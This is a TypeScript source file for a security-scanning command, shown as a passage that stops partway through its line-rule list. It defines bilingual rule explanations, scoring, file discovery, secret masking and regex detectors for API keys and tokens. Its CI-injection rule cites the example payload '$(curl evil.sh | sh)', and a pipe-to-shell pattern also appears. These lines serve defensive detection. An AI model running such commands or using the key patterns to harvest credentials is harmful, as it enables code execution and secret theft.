import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { execFileSync, spawnSync } from 'node:child_process';
import { getOmmDir } from './store.js';
import { getLanguage } from './language.js';
import { readOmmFile, writeOmmFile } from './omm-fs.js';
import YAML from 'yaml';

// `prisme security`: a security score from A to E, without AI and without
// installing anything. Base checks read the project's files (secrets,
// risky code, repository hygiene) and run `npm audit` when there is a
// package-lock.json. gitleaks, osv-scanner and semgrep add their findings
// when they are installed on the machine running the command.
//
// The report never holds a secret: matched values are masked.

export const REPORTS_DIR = '.reports';
export const SECURITY_REPORT = 'security.json';

export type Severity = 'critical' | 'high' | 'medium' | 'low';
export const SEVERITIES: Severity[] = ['critical', 'high', 'medium', 'low'];
export type Grade = 'A' | 'B' | 'C' | 'D' | 'E';

export interface Finding {
  rule: string;
  severity: Severity;
  title: string;
  /** Why it matters, in plain words */
  why: string;
  /** How to fix it */
  fix: string;
  file?: string;
  line?: number;
  /** What was found, secrets masked */
  match?: string;
  /** OWASP Top 10 (2021) category, e.g. "A03:2021 Injection" */
  owasp?: string;
  source: 'prisme' | 'npm-audit' | 'gitleaks' | 'osv-scanner' | 'semgrep';
}

export type ToolStatus = 'ran' | 'missing' | 'failed' | 'skipped';
export interface ToolRun { name: string; status: ToolStatus; findings: number; note?: string }

/** A finding the team checked and decided to leave, from .prisme/security.yaml */
export interface IgnoreRule { rule: string; file?: string; line?: number; reason: string }

export interface SecurityReport {
  version: 1;
  date: string;
  commit: string | null;
  grade: Grade;
  score: number;
  counts: Record<Severity, number>;
  files: number;
  findings: Finding[];
  /** Findings left out by .prisme/security.yaml, with the reason */
  ignored: (Finding & { reason: string })[];
  tools: ToolRun[];
}

type Text = { title: string; why: string; fix: string };
interface Rule { severity: Severity; en: Text; fr: Text }

// Every check, with what a reader needs to understand and fix it.
export const RULES: Record<string, Rule> = {
  'secret-in-code': {
    severity: 'critical',
    en: { title: 'A secret is written in a file', why: 'Anyone who can read the code (a colleague, a leak, a public repository) can use this key as if they were you.', fix: 'Revoke the key now and create a new one, then read it from an environment variable or a secrets manager. Removing the line is not enough: the old key stays in the git history.' },
    fr: { title: 'Un secret est écrit dans un fichier', why: "Toute personne qui lit le code (un collègue, une fuite, un dépôt public) peut utiliser cette clé comme si c'était vous.", fix: "Révoquez la clé tout de suite et créez-en une nouvelle, puis lisez-la depuis une variable d'environnement ou un gestionnaire de secrets. Supprimer la ligne ne suffit pas : l'ancienne clé reste dans l'historique git." },
  },
  'password-in-code': {
    severity: 'high',
    en: { title: 'A password or token looks hard-coded', why: 'A value that looks like a real password or token sits in the code, where everyone who reads it can see it.', fix: 'If it is real, change it and read it from an environment variable. If it is a placeholder or a test value, make that obvious (for example "changeme").' },
    fr: { title: 'Un mot de passe ou un jeton semble écrit en dur', why: 'Une valeur qui ressemble à un vrai mot de passe ou jeton est dans le code, visible par tous ceux qui le lisent.', fix: "Si elle est réelle, changez-la et lisez-la depuis une variable d'environnement. Si c'est un exemple ou une valeur de test, rendez-le évident (par exemple « changeme »)." },
  },
  'env-committed': {
    severity: 'critical',
    en: { title: 'A .env file is in git', why: '.env files usually hold the real passwords and keys of the project; in git, they reach everyone who clones it.', fix: 'Remove it from git (git rm --cached), add .env to .gitignore, change the secrets it held, and commit a .env.example without real values.' },
    fr: { title: 'Un fichier .env est dans git', why: 'Les fichiers .env contiennent en général les vrais mots de passe et clés du projet ; dans git, ils arrivent chez tous ceux qui le clonent.', fix: "Retirez-le de git (git rm --cached), ajoutez .env au .gitignore, changez les secrets qu'il contenait et committez un .env.example sans vraies valeurs." },
  },
  'env-not-ignored': {
    severity: 'low',
    en: { title: '.env is not in .gitignore', why: 'The project reads environment variables, and nothing stops a .env file from being committed by mistake.', fix: 'Add a line ".env" (and ".env.*" except ".env.example") to .gitignore.' },
    fr: { title: '.env n\'est pas dans le .gitignore', why: "Le projet lit des variables d'environnement, et rien n'empêche de committer un fichier .env par erreur.", fix: 'Ajoutez une ligne « .env » (et « .env.* » sauf « .env.example ») au .gitignore.' },
  },
  'key-file-committed': {
    severity: 'high',
    en: { title: 'A key or certificate file is in the repository', why: 'Files like .pem, .key or id_rsa often hold private keys that give access to servers or services.', fix: 'Check whether the file holds a private key. If so, remove it from git, replace the key, and keep keys outside the repository.' },
    fr: { title: 'Un fichier de clé ou de certificat est dans le dépôt', why: "Les fichiers .pem, .key ou id_rsa contiennent souvent des clés privées qui donnent accès à des serveurs ou des services.", fix: 'Vérifiez si le fichier contient une clé privée. Si oui, retirez-le de git, remplacez la clé et gardez les clés hors du dépôt.' },
  },
  'tls-disabled': {
    severity: 'high',
    en: { title: 'Certificate checks are turned off', why: 'Without them, someone on the network can pretend to be the server and read or change the data.', fix: 'Remove this option. If a certificate is refused, fix the certificate (or add your own authority) instead of turning the check off.' },
    fr: { title: 'La vérification des certificats est désactivée', why: 'Sans elle, quelqu\'un sur le réseau peut se faire passer pour le serveur et lire ou modifier les données.', fix: 'Retirez cette option. Si un certificat est refusé, corrigez le certificat (ou ajoutez votre autorité) au lieu de couper la vérification.' },
  },
  'command-injection': {
    severity: 'high',
    en: { title: 'A shell command is built from text', why: 'If part of that text comes from a user, they can add their own commands and run them on the machine.', fix: 'Use execFile or spawn with the arguments as a list, never a command string glued together.' },
    fr: { title: 'Une commande shell est construite avec du texte', why: "Si une partie de ce texte vient d'un utilisateur, il peut y ajouter ses propres commandes et les exécuter sur la machine.", fix: "Utilisez execFile ou spawn avec les arguments en liste, jamais une commande collée en une chaîne." },
  },
  'sql-injection': {
    severity: 'medium',
    en: { title: 'A SQL query is built from text', why: 'If part of the query comes from a user, they can change it to read or delete data.', fix: 'Use parameters (?, $1, :name) or the query builder of your library instead of gluing values into the query.' },
    fr: { title: 'Une requête SQL est construite avec du texte', why: "Si une partie de la requête vient d'un utilisateur, il peut la modifier pour lire ou effacer des données.", fix: 'Utilisez des paramètres (?, $1, :name) ou le constructeur de requêtes de votre bibliothèque au lieu de coller des valeurs dans la requête.' },
  },
  'code-eval': {
    severity: 'medium',
    en: { title: 'Text is run as code', why: 'eval and new Function run any text as a program: if it can come from outside, anything can run.', fix: 'Replace it with a parser (JSON.parse for data) or a fixed table of allowed actions.' },
    fr: { title: 'Du texte est exécuté comme du code', why: "eval et new Function exécutent n'importe quel texte comme un programme : s'il peut venir de l'extérieur, tout peut s'exécuter.", fix: 'Remplacez-le par un analyseur (JSON.parse pour des données) ou une table fixe des actions permises.' },
  },
  'unsafe-deserialize': {
    severity: 'medium',
    en: { title: 'Data is loaded in a way that can run code', why: 'pickle and yaml.load without a safe loader can run code hidden in the data they read.', fix: 'Use yaml.safe_load, or JSON; only unpickle data you produced yourself.' },
    fr: { title: 'Des données sont chargées d\'une façon qui peut exécuter du code', why: 'pickle et yaml.load sans chargeur sûr peuvent exécuter du code caché dans les données lues.', fix: 'Utilisez yaml.safe_load, ou JSON ; ne désérialisez avec pickle que des données produites par vous.' },
  },
  'weak-random': {
    severity: 'medium',
    en: { title: 'A secret value comes from Math.random', why: 'Math.random is predictable: a token or password made with it can be guessed.', fix: 'Use crypto.randomBytes or crypto.randomUUID (Node), crypto.getRandomValues (browser), or secrets (Python).' },
    fr: { title: 'Une valeur secrète vient de Math.random', why: 'Math.random est prévisible : un jeton ou mot de passe fabriqué avec peut être deviné.', fix: 'Utilisez crypto.randomBytes ou crypto.randomUUID (Node), crypto.getRandomValues (navigateur) ou secrets (Python).' },
  },
  'weak-hash': {
    severity: 'medium',
    en: { title: 'Passwords are hashed with MD5 or SHA-1', why: 'These hashes are fast to break: stolen password hashes would be read back quickly.', fix: 'Use bcrypt, scrypt or argon2 for passwords.' },
    fr: { title: 'Les mots de passe sont hachés avec MD5 ou SHA-1', why: 'Ces empreintes se cassent vite : des mots de passe volés seraient retrouvés rapidement.', fix: 'Utilisez bcrypt, scrypt ou argon2 pour les mots de passe.' },
  },
  'html-injection': {
    severity: 'low',
    en: { title: 'HTML is inserted without cleaning', why: 'If the inserted text can come from a user, they can add a script that runs in other people\'s browsers.', fix: 'Insert text with textContent, or clean the HTML first (DOMPurify).' },
    fr: { title: 'Du HTML est inséré sans nettoyage', why: "Si le texte inséré peut venir d'un utilisateur, il peut y glisser un script qui s'exécute chez les autres.", fix: "Insérez du texte avec textContent, ou nettoyez le HTML d'abord (DOMPurify)." },
  },
  'cors-any': {
    severity: 'low',
    en: { title: 'Any website may call this server', why: 'With "Access-Control-Allow-Origin: *" any site open in a browser can read the answers of this server.', fix: 'List the sites allowed to call it instead of *.' },
    fr: { title: "N'importe quel site peut appeler ce serveur", why: "Avec « Access-Control-Allow-Origin: * », n'importe quel site ouvert dans un navigateur peut lire les réponses de ce serveur.", fix: 'Listez les sites autorisés au lieu de *.' },
  },
  'debug-on': {
    severity: 'low',
    en: { title: 'Debug mode is on in the settings', why: 'Debug pages show internal details (paths, settings, sometimes secrets) to anyone who triggers an error.', fix: 'Turn debug off in production, from an environment variable.' },
    fr: { title: 'Le mode debug est activé dans la configuration', why: "Les pages de debug montrent des détails internes (chemins, réglages, parfois des secrets) à qui provoque une erreur.", fix: "Désactivez le debug en production, via une variable d'environnement." },
  },
  'docker-root': {
    severity: 'low',
    en: { title: 'The container runs as root', why: 'If an attacker gets into the container, they have every right inside it, which makes escaping easier.', fix: 'Add a USER line with a non-root user in the Dockerfile.' },
    fr: { title: 'Le conteneur tourne en root', why: "Si un attaquant entre dans le conteneur, il y a tous les droits, ce qui facilite la suite.", fix: 'Ajoutez une ligne USER avec un utilisateur non root dans le Dockerfile.' },
  },
  'workflow-pr-target': {
    severity: 'high',
    en: { title: 'A CI workflow runs code from outside pull requests with secrets', why: 'pull_request_target gives the repository\'s secrets to the workflow; checking out the pull request\'s code lets a stranger run code with them.', fix: 'Use pull_request instead, or never check out the pull request\'s code in a pull_request_target workflow.' },
    fr: { title: 'Un workflow CI exécute le code de pull requests extérieures avec les secrets', why: "pull_request_target donne les secrets du dépôt au workflow ; récupérer le code de la pull request permet à un inconnu d'exécuter son code avec.", fix: "Utilisez pull_request, ou ne récupérez jamais le code de la pull request dans un workflow pull_request_target." },
  },
  'no-lockfile': {
    severity: 'low',
    en: { title: 'Dependency versions are not locked', why: 'Without a lockfile, each install can pull a different (possibly compromised) version of a dependency.', fix: 'Commit the lockfile (package-lock.json, yarn.lock or pnpm-lock.yaml).' },
    fr: { title: 'Les versions des dépendances ne sont pas figées', why: "Sans fichier de verrouillage, chaque installation peut récupérer une autre version (peut-être compromise) d'une dépendance.", fix: 'Committez le fichier de verrouillage (package-lock.json, yarn.lock ou pnpm-lock.yaml).' },
  },
  'vulnerable-dependency': {
    severity: 'high',
    en: { title: 'A dependency has a known security flaw', why: 'The flaw is public: attackers know how to use it.', fix: 'Update the dependency to a fixed version (npm audit fix, or the version given), then run the tests.' },
    fr: { title: 'Une dépendance a une faille de sécurité connue', why: 'La faille est publique : les attaquants savent comment l\'exploiter.', fix: 'Mettez la dépendance à jour vers une version corrigée (npm audit fix, ou la version indiquée), puis lancez les tests.' },
  },
  'tool-finding': {
    severity: 'medium',
    en: { title: 'Finding from a security tool', why: 'A specialized tool flagged this place.', fix: 'Read the tool\'s message and fix the code it points at.' },
    fr: { title: "Alerte d'un outil de sécurité", why: 'Un outil spécialisé a signalé cet endroit.', fix: "Lisez le message de l'outil et corrigez le code indiqué." },
  },
  'connection-string': {
    severity: 'high',
    en: { title: 'A database address holds its password', why: 'An address like postgres://user:password@host gives anyone who reads it full access to the database.', fix: 'Keep the address without the password in the code, and read the password (or the whole address) from an environment variable.' },
    fr: { title: "Une adresse de base de données contient son mot de passe", why: "Une adresse comme postgres://user:motdepasse@hôte donne à qui la lit un accès complet à la base.", fix: "Gardez l'adresse sans le mot de passe dans le code, et lisez le mot de passe (ou toute l'adresse) depuis une variable d'environnement." },
  },
  'path-traversal': {
    severity: 'medium',
    en: { title: 'A file path comes from the request', why: 'With "../" in the path, a visitor can read or send files outside the folder you meant, such as configuration or keys.', fix: 'Resolve the path, then check it stays inside the allowed folder (path.resolve + startsWith), or map names to files from a fixed list.' },
    fr: { title: 'Un chemin de fichier vient de la requête', why: 'Avec « ../ » dans le chemin, un visiteur peut lire ou recevoir des fichiers hors du dossier prévu, comme la configuration ou des clés.', fix: "Résolvez le chemin puis vérifiez qu'il reste dans le dossier autorisé (path.resolve + startsWith), ou associez les noms à des fichiers d'une liste fixe." },
  },
  'open-redirect': {
    severity: 'medium',
    en: { title: 'A redirect goes wherever the request says', why: 'A link to your site can send people to a fake copy of it, which makes phishing easy.', fix: 'Redirect only to paths of your own site, or to addresses from a fixed list.' },
    fr: { title: 'Une redirection va où la requête le demande', why: "Un lien vers votre site peut envoyer les gens vers une fausse copie, ce qui facilite l'hameçonnage.", fix: "Ne redirigez que vers des chemins de votre site, ou vers des adresses d'une liste fixe." },
  },
  'weak-crypto': {
    severity: 'medium',
    en: { title: 'Outdated encryption', why: 'createCipher, DES, RC4 or ECB mode can be broken: what they protect can be read back.', fix: 'Use createCipheriv with AES-256-GCM and a random IV, or a library such as libsodium.' },
    fr: { title: 'Chiffrement dépassé', why: 'createCipher, DES, RC4 ou le mode ECB se cassent : ce qu\'ils protègent peut être relu.', fix: 'Utilisez createCipheriv avec AES-256-GCM et un IV aléatoire, ou une bibliothèque comme libsodium.' },
  },
  'jwt-unverified': {
    severity: 'high',
    en: { title: 'A login token is read without checking its signature', why: 'Anyone can write a token saying "I am the admin": without the signature check, the server believes it.', fix: 'Use jwt.verify (not decode) with the expected algorithm, and never accept the "none" algorithm.' },
    fr: { title: 'Un jeton de connexion est lu sans vérifier sa signature', why: "N'importe qui peut écrire un jeton disant « je suis l'admin » : sans vérification de signature, le serveur le croit.", fix: "Utilisez jwt.verify (pas decode) avec l'algorithme attendu, et n'acceptez jamais l'algorithme « none »." },
  },
  'workflow-script-injection': {
    severity: 'high',
    en: { title: 'A CI step runs text written by strangers', why: 'An issue or pull request title is pasted into a shell command: a title like "$(curl evil.sh | sh)" runs on your CI, with its secrets.', fix: 'Pass the value through an environment variable (env: TITLE: ${{ github.event.issue.title }}) and use "$TITLE" in the script.' },
    fr: { title: "Une étape de CI exécute du texte écrit par des inconnus", why: "Le titre d'une issue ou d'une pull request est collé dans une commande : un titre comme « $(curl evil.sh | sh) » s'exécute sur votre CI, avec ses secrets.", fix: 'Passez la valeur par une variable d\'environnement (env: TITLE: ${{ github.event.issue.title }}) et utilisez "$TITLE" dans le script.' },
  },
  'workflow-permissions': {
    severity: 'low',
    en: { title: 'A CI workflow does not limit its rights', why: 'Without a "permissions:" block, the workflow\'s token may write to the repository: a compromised step could push code or change releases.', fix: 'Add "permissions: contents: read" at the top of the workflow, and grant more only to the jobs that need it.' },
    fr: { title: 'Un workflow de CI ne limite pas ses droits', why: "Sans bloc « permissions: », le jeton du workflow peut écrire dans le dépôt : une étape compromise pourrait pousser du code ou changer une release.", fix: "Ajoutez « permissions: contents: read » en haut du workflow, et n'accordez plus qu'aux jobs qui en ont besoin." },
  },
  'unpinned-action': {
    severity: 'low',
    en: { title: 'A third-party CI action is not pinned', why: 'A tag like @v3 can be moved by its author (or by someone who stole their account) to code that steals your secrets.', fix: 'Pin third-party actions to a full commit SHA (uses: owner/action@<40-character sha> # v3), and let Dependabot update them.' },
    fr: { title: "Une action de CI tierce n'est pas épinglée", why: "Une étiquette comme @v3 peut être déplacée par son auteur (ou par qui a volé son compte) vers du code qui vole vos secrets.", fix: 'Épinglez les actions tierces à un commit complet (uses: auteur/action@<sha de 40 caractères> # v3), et laissez Dependabot les mettre à jour.' },
  },
  'ci-install-unlocked': {
    severity: 'low',
    en: { title: 'The CI installs without the lockfile', why: '"npm install" may pull versions other than the tested ones; "npm ci" installs exactly the lockfile.', fix: 'Use "npm ci" (or "yarn install --frozen-lockfile", "pnpm install --frozen-lockfile") in CI.' },
    fr: { title: 'La CI installe sans respecter le verrouillage', why: "« npm install » peut récupérer d'autres versions que celles testées ; « npm ci » installe exactement le fichier de verrouillage.", fix: 'Utilisez « npm ci » (ou « yarn install --frozen-lockfile », « pnpm install --frozen-lockfile ») en CI.' },
  },
  'no-dependency-updates': {
    severity: 'low',
    en: { title: 'Nothing keeps dependencies up to date', why: 'Security fixes in dependencies only help once you install them; without a bot, they wait until someone remembers.', fix: 'Add .github/dependabot.yml (or Renovate) for your package manager and for GitHub Actions.' },
    fr: { title: 'Rien ne tient les dépendances à jour', why: "Les correctifs de sécurité des dépendances n'aident qu'une fois installés ; sans robot, ils attendent que quelqu'un y pense.", fix: 'Ajoutez .github/dependabot.yml (ou Renovate) pour votre gestionnaire de paquets et pour les GitHub Actions.' },
  },
  'no-security-policy': {
    severity: 'low',
    en: { title: 'No way to report a security flaw', why: 'Someone who finds a flaw does not know whom to tell privately, so it may end up public before it is fixed.', fix: 'Add a SECURITY.md that says how to report a flaw privately (an address, or GitHub private reporting).' },
    fr: { title: 'Aucun moyen de signaler une faille', why: "Quelqu'un qui trouve une faille ne sait pas à qui le dire en privé : elle risque de devenir publique avant d'être corrigée.", fix: 'Ajoutez un SECURITY.md qui dit comment signaler une faille en privé (une adresse, ou le signalement privé de GitHub).' },
  },
  'remote-script': {
    severity: 'medium',
    en: { title: 'A script is downloaded and run without checking', why: '"curl … | sh" runs whatever the server sends today: if that server or the network is compromised, so is your machine or image.', fix: 'Download the file, check its checksum or signature, then run it; or install from a package manager.' },
    fr: { title: 'Un script est téléchargé et exécuté sans vérification', why: "« curl … | sh » exécute ce que le serveur envoie ce jour-là : si ce serveur ou le réseau est compromis, votre machine ou image l'est aussi.", fix: "Téléchargez le fichier, vérifiez sa somme de contrôle ou sa signature, puis exécutez-le ; ou installez depuis un gestionnaire de paquets." },
  },
  'insecure-download': {
    severity: 'medium',
    en: { title: 'Something is downloaded over plain http', why: 'Over http, anyone on the network can swap the file for another one.', fix: 'Download over https, and check the checksum.' },
    fr: { title: 'Un téléchargement passe par http', why: "En http, n'importe qui sur le réseau peut remplacer le fichier par un autre.", fix: 'Téléchargez en https, et vérifiez la somme de contrôle.' },
  },
  'docker-latest': {
    severity: 'low',
    en: { title: 'The container image is not pinned', why: '"FROM image:latest" (or no tag) changes without warning: a build can pick up a broken or compromised image.', fix: 'Pin a version (node:22.11-alpine), or better a digest (@sha256:…).' },
    fr: { title: "L'image du conteneur n'est pas figée", why: "« FROM image:latest » (ou sans étiquette) change sans prévenir : un build peut récupérer une image cassée ou compromise.", fix: 'Figez une version (node:22.11-alpine), ou mieux une empreinte (@sha256:…).' },
  },
};

// OWASP Top 10 (2021) category of each rule, so a reader can look it up.
export const OWASP: Record<string, string> = {
  'secret-in-code': 'A07:2021 Identification and Authentication Failures',
  'password-in-code': 'A07:2021 Identification and Authentication Failures',
  'env-committed': 'A07:2021 Identification and Authentication Failures',
  'key-file-committed': 'A07:2021 Identification and Authentication Failures',
  'connection-string': 'A07:2021 Identification and Authentication Failures',
  'jwt-unverified': 'A07:2021 Identification and Authentication Failures',
  'tls-disabled': 'A02:2021 Cryptographic Failures',
  'weak-random': 'A02:2021 Cryptographic Failures',
  'weak-hash': 'A02:2021 Cryptographic Failures',
  'weak-crypto': 'A02:2021 Cryptographic Failures',
  'command-injection': 'A03:2021 Injection',
  'sql-injection': 'A03:2021 Injection',
  'code-eval': 'A03:2021 Injection',
  'html-injection': 'A03:2021 Injection',
  'workflow-script-injection': 'A03:2021 Injection',
  'path-traversal': 'A01:2021 Broken Access Control',
  'open-redirect': 'A01:2021 Broken Access Control',
  'cors-any': 'A05:2021 Security Misconfiguration',
  'debug-on': 'A05:2021 Security Misconfiguration',
  'docker-root': 'A05:2021 Security Misconfiguration',
  'env-not-ignored': 'A05:2021 Security Misconfiguration',
  'workflow-permissions': 'A05:2021 Security Misconfiguration',
  'unsafe-deserialize': 'A08:2021 Software and Data Integrity Failures',
  'workflow-pr-target': 'A08:2021 Software and Data Integrity Failures',
  'unpinned-action': 'A08:2021 Software and Data Integrity Failures',
  'remote-script': 'A08:2021 Software and Data Integrity Failures',
  'insecure-download': 'A08:2021 Software and Data Integrity Failures',
  'docker-latest': 'A08:2021 Software and Data Integrity Failures',
  'vulnerable-dependency': 'A06:2021 Vulnerable and Outdated Components',
  'no-lockfile': 'A06:2021 Vulnerable and Outdated Components',
  'ci-install-unlocked': 'A06:2021 Vulnerable and Outdated Components',
  'no-dependency-updates': 'A06:2021 Vulnerable and Outdated Components',
};

const PENALTY: Record<Severity, number> = { critical: 30, high: 15, medium: 6, low: 2 };
/** One rule weighs at most this many findings, so 40 innerHTML do not hide the rest. */
const PER_RULE_CAP = 2;

export function scoreFindings(findings: Finding[]): { score: number; grade: Grade } {
  const byRule = new Map<string, number[]>();
  for (const f of findings) byRule.set(f.rule, [...(byRule.get(f.rule) ?? []), PENALTY[f.severity]]);
  let penalty = 0;
  for (const weights of byRule.values()) penalty += weights.sort((a, b) => b - a).slice(0, PER_RULE_CAP).reduce((a, b) => a + b, 0);
  const score = Math.max(0, 100 - penalty);
  let grade: Grade = score >= 90 ? 'A' : score >= 75 ? 'B' : score >= 60 ? 'C' : score >= 40 ? 'D' : 'E';
  // A secret in the code or a critical flaw is never better than D; a high one never better than C.
  const worst = (cap: Grade) => { if (grade < cap) grade = cap; };
  if (findings.some(f => f.severity === 'critical')) worst('D');
  else if (findings.some(f => f.severity === 'high')) worst('C');
  return { score, grade };
}

// ── files ─────────────────────────────────────────────────

const SKIP_DIRS = new Set(['node_modules', '.git', '.prisme', '.omm', 'dist', 'build', 'out', 'coverage', 'vendor', '.venv', 'venv', '__pycache__', '.next', '.nuxt', 'target']);
const SKIP_FILES = /(^|\/)(package-lock\.json|yarn\.lock|pnpm-lock\.yaml|Cargo\.lock|poetry\.lock|composer\.lock|go\.sum)$|\.min\.(js|css)$|\.map$/;
const MAX_FILE_SIZE = 1024 * 1024;
const MAX_FILES = 20_000;

function git(args: string[], cwd: string): string | null {
  try {
    return execFileSync('git', args, { cwd, encoding: 'utf-8', stdio: ['ignore', 'pipe', 'ignore'], maxBuffer: 64 * 1024 * 1024 });
  } catch {
    return null;
  }
}

/** Project files: tracked and new ones in a git repository, else a walk that skips the usual build folders. */
export function projectFiles(cwd: string): string[] {
  const listed = git(['ls-files', '--cached', '--others', '--exclude-standard'], cwd);
  let files: string[];
  if (listed !== null) {
    const deleted = new Set((git(['ls-files', '--deleted'], cwd) ?? '').split('\n'));
    files = listed.split('\n').filter(f => f && !deleted.has(f));
  } else {
    files = [];
    const walk = (dir: string) => {
      for (const entry of fs.readdirSync(path.join(cwd, dir), { withFileTypes: true })) {
        if (files.length >= MAX_FILES) return;
        const rel = dir ? `${dir}/${entry.name}` : entry.name;
        if (entry.isDirectory()) { if (!SKIP_DIRS.has(entry.name)) walk(rel); }
        else if (entry.isFile()) files.push(rel);
      }
    };
    walk('');
  }
  return files.filter(f => !f.split('/').some(part => SKIP_DIRS.has(part))).slice(0, MAX_FILES);
}

function readText(cwd: string, file: string): string | null {
  try {
    const full = path.join(cwd, file);
    const stat = fs.lstatSync(full);
    if (!stat.isFile() || stat.size > MAX_FILE_SIZE) return null;
    const buffer = fs.readFileSync(full);
    if (buffer.subarray(0, 8000).includes(0)) return null; // binary
    return buffer.toString('utf-8');
  } catch {
    return null;
  }
}

/** Shows the start and end of a secret only. */
export function mask(value: string): string {
  if (value.length <= 8) return '••••';
  return `${value.slice(0, 4)}…${value.slice(-2)}`;
}

function entropy(s: string): number {
  const counts = new Map<string, number>();
  for (const c of s) counts.set(c, (counts.get(c) ?? 0) + 1);
  let h = 0;
  for (const n of counts.values()) { const p = n / s.length; h -= p * Math.log2(p); }
  return h;
}

// ── checks on file contents ───────────────────────────────

// Keys with a recognizable shape, in the spirit of gitleaks' rules: a match
// is almost never a false alarm. `severity` lowers the ones that are often
// test values or less powerful.
const SECRET_PATTERNS: { name: string; re: RegExp; severity?: Severity }[] = [
  { name: 'AWS access key', re: /\b(?:AKIA|ASIA|ABIA|ACCA)[0-9A-Z]{16}\b/g },
  { name: 'private key', re: /-----BEGIN (?:RSA |EC |DSA |OPENSSH |PGP |ENCRYPTED )?PRIVATE KEY(?: BLOCK)?-----/g },
  { name: 'GitHub token', re: /\b(?:gh[pousr]_[A-Za-z0-9]{36,}|github_pat_[A-Za-z0-9_]{60,})\b/g },
  { name: 'GitLab token', re: /\bgl(?:pat|dt|ptt|rt)-[A-Za-z0-9_-]{20,}\b/g },
  { name: 'Slack token', re: /\bxox[baprse]-[A-Za-z0-9-]{10,}\b/g },
  { name: 'Slack webhook', re: /https:\/\/hooks\.slack\.com\/(?:services|workflows)\/[A-Za-z0-9+/]{20,}/g },
  { name: 'Discord webhook', re: /https:\/\/(?:ptb\.|canary\.)?discord(?:app)?\.com\/api\/webhooks\/\d+\/[A-Za-z0-9_-]{30,}/g },
  { name: 'Telegram bot token', re: /\b\d{8,10}:AA[A-Za-z0-9_-]{33}\b/g },
  { name: 'Stripe live key', re: /\b(?:sk|rk)_live_[A-Za-z0-9]{20,}\b/g },
  { name: 'Google API key', re: /\bAIza[0-9A-Za-z_-]{35}\b/g, severity: 'high' },
  { name: 'Google service account', re: /"type"\s*:\s*"service_account"/g },
  { name: 'Anthropic API key', re: /\bsk-ant-(?:api|admin)\d{2}-[A-Za-z0-9_-]{80,}\b/g },
  { name: 'OpenAI API key', re: /\bsk-(?:proj-|svcacct-|admin-)?[A-Za-z0-9_-]{20,}T3BlbkFJ[A-Za-z0-9_-]{20,}\b/g },
  { name: 'AI API key', re: /\bsk-(?:ant-|proj-)?[A-Za-z0-9_-]{32,}\b/g },
  { name: 'Hugging Face token', re: /\bhf_[A-Za-z0-9]{34,}\b/g },
  { name: 'npm token', re: /\bnpm_[A-Za-z0-9]{36}\b/g },
  { name: 'PyPI token', re: /\bpypi-AgEIcHlwaS5vcmc[A-Za-z0-9_-]{50,}\b/g },
  { name: 'SendGrid key', re: /\bSG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}\b/g },
  { name: 'Mailgun key', re: /\bkey-[0-9a-f]{32}\b/g, severity: 'high' },
  { name: 'Mailchimp key', re: /\b[0-9a-f]{32}-us\d{1,2}\b/g, severity: 'high' },
  { name: 'Twilio key', re: /\bSK[0-9a-f]{32}\b/g, severity: 'high' },
  { name: 'Shopify token', re: /\bshp(?:at|ca|pa|ss)_[a-fA-F0-9]{32}\b/g },
  { name: 'DigitalOcean token', re: /\bdo[opr]_v1_[a-f0-9]{64}\b/g },
  { name: 'Supabase token', re: /\bsbp_[a-f0-9]{40}\b/g },
  { name: 'Databricks token', re: /\bdapi[a-f0-9]{32}(?:-\d)?\b/g },
  { name: 'Postman key', re: /\bPMAK-[a-f0-9]{24}-[a-f0-9]{34}\b/g },
  { name: 'Doppler token', re: /\bdp\.pt\.[A-Za-z0-9]{43}\b/g },
  { name: 'Linear key', re: /\blin_api_[A-Za-z0-9]{40}\b/g },
  { name: 'Notion token', re: /\b(?:ntn_[A-Za-z0-9]{46}|secret_[A-Za-z0-9]{43})\b/g },
  { name: 'Atlassian token', re: /\bATATT3[A-Za-z0-9_=-]{180,}\b/g },
  { name: 'Square token', re: /\b(?:EAAA|sq0atp-)[A-Za-z0-9_-]{22,60}\b/g, severity: 'high' },
  { name: 'Azure storage key', re: /AccountKey=[A-Za-z0-9+/]{86}==/g },
  { name: 'age secret key', re: /\bAGE-SECRET-KEY-1[0-9A-Z]{58}\b/g },
  { name: 'JSON Web Token', re: /\beyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b/g, severity: 'medium' },
];

// A database or queue address with a password in it: scheme://user:password@host
const CONNECTION_STRING = /\b((?:postgres(?:ql)?|mysql|mariadb|mongodb(?:\+srv)?|redis|rediss|amqps?|mssql|sqlserver):\/\/[^\s:@/'"`]+):([^\s@/'"`]{3,})@/gi;

const ASSIGNED_SECRET = /\b([\w-]*(?:password|passwd|pwd|secret|api[_-]?key|access[_-]?token|auth[_-]?token|private[_-]?key)[\w-]*)["']?\s*[:=]\s*["'`]([^"'`\s]{10,})["'`]/gi;
const PLACEHOLDER = /example|sample|dummy|placeholder|changeme|change[_-]?me|your[_-]|xxx|\*\*\*|<|\$\{|\{\{|process\.env|os\.environ|getenv|redacted|fake|test|todo|none|null|undefined/i;

const CODE_FILE = /\.(m?[jt]sx?|cjs|py|rb|php|go|java|kt|cs|rs|swift|scala|vue|svelte)$/;
const JS_FILE = /\.(m?[jt]sx?|cjs|vue|svelte|html?)$/;
const DOC_FILE = /\.(md|mdx|markdown|rst|adoc|txt)$/i;
const TEST_FILE = /(^|\/)(__tests__|tests?|spec|fixtures?|__mocks__)\/|\.(test|spec)\.[a-z]+$/i;

interface LineRule { rule: string; re: RegExp; files: RegExp }
// The start of a real query, not a word like "update" in a message.
const SQL = '(?:SELECT\\s[^"\'`]*?\\bFROM\\b|INSERT\\s+INTO\\b|UPDATE\\s+[\\w."`]+\\s+SET\\b|DELETE\\s+FROM\\b)';
const LINE_RULES: LineRule[] = [
  { rule: 'tls-disabled', re: /rejectUnauthorized\s*:\s*false|NODE_TLS_REJECT_UNAUTHORIZED\s*=\s*['"]?0|verify\s*=\s*False\b|InsecureSkipVerify\s*:\s*true|CURLOPT_SSL_VERIFYPEER\s*,\s*(?:false|0)/, files: /./ },
  { rule: 'command-injection', re: /\b(?:exec|execSync)\s*\(\s*(?:`[^`]*\$\{|['"][^'"]*['"]\s*\+)|\bos\.system\s*\(\s*(?:f['"]|['"][^'"]*['"]\s*[+%])|subprocess\.\w+\([^)]*shell\s*=\s*True/, files: CODE_FILE },
